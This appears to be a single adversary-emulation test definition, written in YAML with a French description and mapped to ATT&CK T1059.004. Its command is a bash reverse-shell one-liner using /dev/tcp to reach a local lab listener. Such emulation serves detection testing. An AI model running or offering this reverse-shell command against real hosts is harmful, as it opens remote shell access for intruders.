- id: 4c5d6e7f-8a9b-4c0d-9e1f-2a3b4c5d6e7f
  name: T1059.004 - Linux Reverse Shell via /dev/tcp
  description: |
    Pattern le plus courant — bash redirige vers /dev/tcp pour ouvrir un
    canal interactif vers un listener de lab. Connexion timeout 3s.
  tactic: execution
  technique:
    attack_id: T1059.004
    name: Unix Shell
  platforms:
    linux:
      sh:
        command: |
          timeout 3 bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1' || true
        timeout: 10
